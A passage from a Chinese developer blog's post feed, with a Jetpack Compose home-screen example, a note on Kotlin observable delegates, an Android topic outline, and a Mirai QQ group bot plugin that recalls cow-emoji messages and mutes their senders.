class="token punctuation">}</span>        <span class="token keyword">val</span> items <span class="token operator">=</span> <span class="token function">listOf</span><span class="token punctuation">(</span><span class="token string">"主页"</span><span class="token punctuation">,</span> <span class="token string">"通知"</span><span class="token punctuation">,</span> <span class="token string">"搜索"</span><span class="token punctuation">)</span>        <span class="token function">Scaffold</span><span class="token punctuation">(</span>            bottomBar <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token function">BottomNavigation</span><span class="token punctuation">(</span>                    backgroundColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>White<span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">height</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    items<span class="token punctuation">.</span><span class="token function">forEachIndexed</span> <span class="token punctuation">{</span> index<span class="token punctuation">,</span> item <span class="token operator">-&gt;</span>                        <span class="token function">BottomNavigationItem</span><span class="token punctuation">(</span>                            icon <span class="token operator">=</span> <span class="token punctuation">{</span>                                <span class="token keyword">when</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>                                    <span class="token number">0</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Home<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                    <span class="token number">1</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Notifications<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                    <span class="token keyword">else</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Search<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                            label <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token function">Text</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                            selected <span class="token operator">=</span> selectedItem <span class="token operator">==</span> index<span class="token punctuation">,</span>                            onClick <span class="token operator">=</span> <span class="token punctuation">{</span> selectedItem <span class="token operator">=</span> index <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Column</span><span class="token punctuation">(</span>                Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Row</span><span class="token punctuation">(</span>                    verticalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterVertically                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">Surface</span><span class="token punctuation">(</span>                        shape <span class="token operator">=</span> CircleShape<span class="token punctuation">,</span>                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">Image</span><span class="token punctuation">(</span>                            painter <span class="token operator">=</span> <span class="token function">rememberImagePainter</span><span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token operator">=</span> avatar<span class="token punctuation">)</span><span class="token punctuation">,</span>                            contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                            contentScale <span class="token operator">=</span> ContentScale<span class="token punctuation">.</span>Crop                        <span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                    <span class="token function">Text</span><span class="token punctuation">(</span>                        text <span class="token operator">=</span> <span class="token string">"主页"</span><span class="token punctuation">,</span>                        style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                            fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                            fontSize <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>sp                        <span class="token punctuation">)</span><span class="token punctuation">,</span>                        modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token function">Text</span><span class="token punctuation">(</span>                    text <span class="token operator">=</span> <span class="token string">"我的工作"</span><span class="token punctuation">,</span>                    style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                        fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                        fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">.</span>dp<span class="token punctuation">,</span> bottom <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_issue_opened<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"议题"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF25CA25</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_pull_request<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"拉取请求"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF11ABF1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_git_repository_line<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"仓库"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF8811F1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_organization<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"组织"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFFF18C11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">Divider</span><span class="token punctuation">(</span>                    color <span class="token operator">=</span> Color<span class="token punctuation">.</span>Gray<span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                    <span class="token function">Column</span><span class="token punctuation">(</span>                        Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>vertical <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">Text</span><span class="token punctuation">(</span>                            text <span class="token operator">=</span> <span class="token string">"收藏夹"</span><span class="token punctuation">,</span>                            style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                                fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                            <span class="token punctuation">)</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>bottom <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                        <span class="token function">Text</span><span class="token punctuation">(</span>                            text <span class="token operator">=</span> <span class="token string">"将仓库加入收藏夹以便随时快速访问，而无需搜索"</span><span class="token punctuation">,</span>                            style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                            <span class="token punctuation">)</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                        <span class="token function">Column</span><span class="token punctuation">(</span>                            modifier <span class="token operator">=</span> Modifier                                <span class="token punctuation">.</span><span class="token function">fillMaxWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                            horizontalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterHorizontally                        <span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">Card</span><span class="token punctuation">(</span>                                modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>horizontal <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                                shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>                            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token function">Button</span><span class="token punctuation">(</span>                                    onClick <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/*TODO*/</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                                    elevation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">fillMaxWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    colors <span class="token operator">=</span> ButtonDefaults<span class="token punctuation">.</span><span class="token function">buttonColors</span><span class="token punctuation">(</span>                                        backgroundColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Transparent                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token function">Text</span><span class="token punctuation">(</span>                                        text <span class="token operator">=</span> <span class="token string">"添加收藏"</span><span class="token punctuation">,</span>                                        style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                            fontSize <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">.</span>sp<span class="token punctuation">,</span>                                            color <span class="token operator">=</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF229DD5</span><span class="token punctuation">)</span>                                        <span class="token punctuation">)</span><span class="token punctuation">,</span>                                        modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">WorkSelection</span><span class="token punctuation">(</span>        icon<span class="token operator">:</span> Int<span class="token punctuation">,</span>        text<span class="token operator">:</span> String<span class="token punctuation">,</span>        color<span class="token operator">:</span> Color    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Row</span><span class="token punctuation">(</span>            Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>vertical <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>            verticalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterVertically        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 圆角icon</span>            <span class="token function">Surface</span><span class="token punctuation">(</span>                shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>end <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Image</span><span class="token punctuation">(</span>                    painter <span class="token operator">=</span> <span class="token function">painterResource</span><span class="token punctuation">(</span>id <span class="token operator">=</span> icon<span class="token punctuation">)</span><span class="token punctuation">,</span>                    contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier                        <span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">background</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">,</span>                    colorFilter <span class="token operator">=</span> ColorFilter<span class="token punctuation">.</span><span class="token function">tint</span><span class="token punctuation">(</span>Color<span class="token punctuation">.</span>White<span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token function">Text</span><span class="token punctuation">(</span>                text <span class="token operator">=</span> text<span class="token punctuation">,</span>                style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                    fontSize <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">.</span>sp                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Preview</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">Preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>感觉还行，学习一上午Compose的成果</p><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Compose </tag>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Kotlin委托快捷的创建可观察属性</title>
      <link href="/2021/12/18/kotlin-delegates-observable/"/>
      <url>/2021/12/18/kotlin-delegates-observable/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Kotlin委托快捷的创建可观察属性"><a href="#利用Kotlin委托快捷的创建可观察属性" class="headerlink" title="利用Kotlin委托快捷的创建可观察属性"></a>利用Kotlin委托快捷的创建可观察属性</h1><p>废话少说，上代码</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> User <span class="token punctuation">{</span>    <span class="token keyword">var</span> name<span class="token operator">:</span> String <span class="token keyword">by</span> Delegates<span class="token punctuation">.</span><span class="token function">observable</span><span class="token punctuation">(</span><span class="token string">"初始值"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> prop<span class="token punctuation">,</span> old<span class="token punctuation">,</span> new <span class="token operator">-&gt;</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"旧值：<span class="token interpolation variable">$old</span> -&gt; 新值：<span class="token interpolation variable">$new</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但不同于RxJava，Flow和LiveData，它只能在变量声明时指定观察的回调函数</p><p>这也使得它不能在功能上完全取代掉LiveData（没错，我是标题党），尤其是在MVVM这种分层架构的架构模式中</p><p>但这不妨碍它成为LiveData被时代抛弃的理由之一，毕竟它可是Kotlin原生库里的东西。如果不需要在变量声明之后指定回调函数，那什么RxJava，Flow都得靠边站了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> 委托 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 笔记</title>
      <link href="/2021/12/02/useful-android-widget/"/>
      <url>/2021/12/02/useful-android-widget/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-笔记"><a href="#Android-笔记" class="headerlink" title="Android 笔记"></a>Android 笔记</h1><h2 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h2><h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h3><h3 id="ViewPager2"><a href="#ViewPager2" class="headerlink" title="ViewPager2"></a>ViewPager2</h3><h3 id="DrawerLayout-侧滑栏"><a href="#DrawerLayout-侧滑栏" class="headerlink" title="DrawerLayout (侧滑栏)"></a>DrawerLayout (侧滑栏)</h3><h3 id="CoordinatorLayout-（协调者布局"><a href="#CoordinatorLayout-（协调者布局" class="headerlink" title="CoordinatorLayout （协调者布局)"></a>CoordinatorLayout （协调者布局)</h3><h3 id="Toolbar"><a href="#Toolbar" class="headerlink" title="Toolbar"></a>Toolbar</h3><h3 id="BottomNavigationView"><a href="#BottomNavigationView" class="headerlink" title="BottomNavigationView"></a>BottomNavigationView</h3><h3 id="TabLayout"><a href="#TabLayout" class="headerlink" title="TabLayout"></a>TabLayout</h3><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="DataBinding"><a href="#DataBinding" class="headerlink" title="DataBinding"></a>DataBinding</h3><h3 id="Paging3"><a href="#Paging3" class="headerlink" title="Paging3"></a>Paging3</h3><h3 id="Room"><a href="#Room" class="headerlink" title="Room"></a>Room</h3><h3 id="LiveData-ViewModel"><a href="#LiveData-ViewModel" class="headerlink" title="LiveData/ViewModel"></a>LiveData/ViewModel</h3><h3 id="LifeCycle"><a href="#LifeCycle" class="headerlink" title="LifeCycle"></a>LifeCycle</h3><h2 id="外部库"><a href="#外部库" class="headerlink" title="外部库"></a>外部库</h2><h3 id="OkHttp-Retrofit"><a href="#OkHttp-Retrofit" class="headerlink" title="OkHttp/Retrofit"></a>OkHttp/Retrofit</h3><h3 id="Glide"><a href="#Glide" class="headerlink" title="Glide"></a>Glide</h3><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><h3 id="Kotlinx-Corountine-Kotlin协程"><a href="#Kotlinx-Corountine-Kotlin协程" class="headerlink" title="Kotlinx.Corountine (Kotlin协程)"></a>Kotlinx.Corountine (Kotlin协程)</h3><h3 id="Kotlinx-Serialization"><a href="#Kotlinx-Serialization" class="headerlink" title="Kotlinx.Serialization"></a>Kotlinx.Serialization</h3><h3 id="LitePal"><a href="#LitePal" class="headerlink" title="LitePal"></a>LitePal</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> 知识梳理 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello-Mirai</title>
      <link href="/2021/12/02/hello-mirai/"/>
      <url>/2021/12/02/hello-mirai/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Mirai"><a href="#Hello-Mirai" class="headerlink" title="Hello Mirai"></a>Hello Mirai</h1><blockquote><p>Mirai 是一款十分优秀的QQ机器人框架</p><p>由于Mirai提供了一套http-api的功能实现</p><p>我们几乎可以使用任何一种语言实现QQ机器人</p><p>而其本体项目是由Kotlin开发的，这正对我胃口！</p></blockquote><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><blockquote><p>一副古怪的牛牛之风席卷了咱群</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E6%88%AA%E5%9B%BE20211202010933.png" alt="QQ截图20211202010933"></p><blockquote><p>撂下狠话</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E6%88%AA%E5%9B%BE20211202011010.png" alt="QQ截图20211202011010"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">package</span> kim<span class="token punctuation">.</span>bifrost<span class="token punctuation">.</span>rain<span class="token punctuation">.</span>anticowemoji<span class="token keyword">import</span> kotlinx<span class="token punctuation">.</span>coroutines<span class="token punctuation">.</span>delay<span class="token keyword">import</span> kotlinx<span class="token punctuation">.</span>coroutines<span class="token punctuation">.</span>launch<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>console<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>jvm<span class="token punctuation">.</span>JvmPluginDescription<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>console<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>jvm<span class="token punctuation">.</span>KotlinPlugin<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>contact<span class="token punctuation">.</span>MemberPermission<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>GlobalEventChannel<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>events<span class="token punctuation">.</span>GroupMessageEvent<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>events<span class="token punctuation">.</span>NudgeEvent<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>message<span class="token punctuation">.</span>code<span class="token punctuation">.</span>MiraiCode<span class="token punctuation">.</span>deserializeMiraiCode<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>message<span class="token punctuation">.</span>data<span class="token punctuation">.</span>MessageSource<span class="token punctuation">.</span>Key<span class="token punctuation">.</span>recall<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token keyword">import</span> kotlin<span class="token punctuation">.</span>random<span class="token punctuation">.</span>Random<span class="token comment">/** * kim.bifrost.rain.anticowemoji.AntiCowEmoji * AntiCowEmoji * * @author 寒雨 * @since 2021/12/1 17:11 **/</span><span class="token keyword">object</span> AntiCowEmoji <span class="token operator">:</span> <span class="token function">KotlinPlugin</span><span class="token punctuation">(</span>    <span class="token function">JvmPluginDescription</span><span class="token punctuation">(</span>        id <span class="token operator">=</span> <span class="token string">"kim.bifrost.rain.anticowemoji.AntiCowEmoji"</span><span class="token punctuation">,</span>        version <span class="token operator">=</span> <span class="token string">"1.0.0"</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">name</span><span class="token punctuation">(</span><span class="token string">"AntiCowEmoji"</span><span class="token punctuation">)</span>        <span class="token function">author</span><span class="token punctuation">(</span><span class="token string">"Rain"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onEnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 芙兰杀爆牛牛人</span>        GlobalEventChannel<span class="token punctuation">.</span><span class="token function">parentScope</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subscribeAlways<span class="token operator">&lt;</span>GroupMessageEvent<span class="token operator">&gt;</span> <span class="token punctuation">{</span> event <span class="token operator">-&gt;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>group<span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token number">755478639L</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">contentToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"\uD83D\uDC2E"</span><span class="token punctuation">)</span>                    <span class="token operator">||</span> event<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">contentToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"\uD83D\uDC02"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>sender<span class="token punctuation">.</span>permission <span class="token operator">&gt;=</span> MemberPermission<span class="token punctuation">.</span>ADMINISTRATOR<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token label symbol">@subscribeAlways</span> let <span class="token punctuation">{</span>                        bot<span class="token punctuation">.</span><span class="token function">getGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">"管理员也不许牛!!! [mirai:at:<span class="token interpolation"><span class="token delimiter variable">${</span>sender<span class="token punctuation">.</span>id<span class="token delimiter variable">}</span></span>]"</span><span class="token punctuation">.</span><span class="token function">deserializeMiraiCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                    <span class="token comment">// 撤 回 消 息</span>                    message<span class="token punctuation">.</span><span class="token function">recall</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment">// 暴 政 执 行</span>                    sender<span class="token punctuation">.</span><span class="token function">mute</span><span class="token punctuation">(</span>Random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment">// 温 柔 告 诫</span>                    launch <span class="token punctuation">{</span>                        <span class="token function">delay</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        subject<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token 